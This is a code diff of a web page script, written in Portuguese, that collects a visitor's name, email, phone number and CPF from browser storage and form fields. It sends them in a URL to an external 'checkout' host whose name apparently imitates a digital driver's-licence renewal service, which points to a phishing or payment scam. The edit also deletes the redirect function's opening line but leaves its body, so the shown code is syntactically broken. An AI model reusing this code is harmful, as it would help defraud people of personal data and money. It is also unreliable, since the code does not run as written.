@@ -186,49 +186,56 @@
 
         <script>
             const CHECKOUT_URL = "https://seguro.renovacaocnhdigital.site/";
-            const userData = JSON.parse(localStorage.getItem('userData'));
-
-            function redirecionarPagamento() {
+                const dadosCpf = JSON.parse(localStorage.getItem('userData') || '{}');
+                const dadosCompletos = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
+                
+                const nome = dadosCompletos.nome || dadosCpf.nome || 'Usuário';
+                const email = dadosCpf.email || document.getElementById('email-usuario').value || '';
+                const telefone = dadosCpf.telefone || document.getElementById('telefone-usuario').value || '';
+                const cpf = dadosCompletos.cpf || dadosCpf.cpf || '';
+                
                 const sep = CHECKOUT_URL.includes('?') ? '&' : '?';
 
                 return window.location.href =
                     CHECKOUT_URL + sep +
-                    'name=' + encodeURIComponent(userData.nome) +
-                    '&email=' + encodeURIComponent(userData.email) +
-                    '&telephone=' + encodeURIComponent(userData.telefone) +
-                    '&document=' + encodeURIComponent(userData.cpf);
+                    'name=' + encodeURIComponent(nome) +
+                    '&email=' + encodeURIComponent(email) +
+                    '&telephone=' + encodeURIComponent(telefone) +
+                    '&document=' + encodeURIComponent(cpf);
             }
 
             function preencherDadosUsuario() {
                 const dadosCpf = JSON.parse(localStorage.getItem('userData') || '{}');
+                const dadosCompletos = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
                 
-                if (dadosCpf.nome) {
-                    document.getElementById('nome-usuario').value = dadosCpf.nome;
+                // Preferir dados completos, se não, usar userData
+                const nome = dadosCompletos.nome || dadosCpf.nome || 'Não informado';
+                const cpf = dadosCompletos.cpf || dadosCpf.cpf || '';
+                const email = dadosCpf.email || localStorage.getItem('emailUsuario') || '';
+                const telefone = dadosCpf.telefone || localStorage.getItem('telefoneUsuario') || '';
+                
+                if (nome && nome !== 'Não informado') {
+                    document.getElementById('nome-usuario').value = nome;
                     
                     // Atualizar o botão de login no cabeçalho com o primeiro nome
-                    const primeiroNome = dadosCpf.nome.split(' ')[0];
+                    const primeiroNome = nome.split(' ')[0];
                     const userNameHeader = document.getElementById('user-name-header');
                     if (userNameHeader) {
                         userNameHeader.textContent = primeiroNome;
                     }
                 }
                 
-                if (dadosCpf.cpf) {
-                    // Formatar CPF
-                    const cpfFormatado = dadosCpf.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                if (cpf) {
+                    const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                     document.getElementById('cpf-usuario').value = cpfFormatado;
                 }
                 
-                // Tentar buscar email salvo
-                const emailSalvo = localStorage.getItem('emailUsuario') || sessionStorage.getItem('emailUsuario') || '';
-                if (emailSalvo) {
-                    document.getElementById('email-usuario').value = emailSalvo;
+                if (email) {
+                    document.getElementById('email-usuario').value = email;
                 }
                 
-                // Tentar buscar telefone salvo
-                const telefoneSalvo = localStorage.getItem('telefoneUsuario') || '';
-                if (telefoneSalvo) {
-                    document.getElementById('telefone-usuario').value = telefoneSalvo;
+                if (telefone) {
+                    document.getElementById('telefone-usuario').value = telefone;
                 }
             }
 
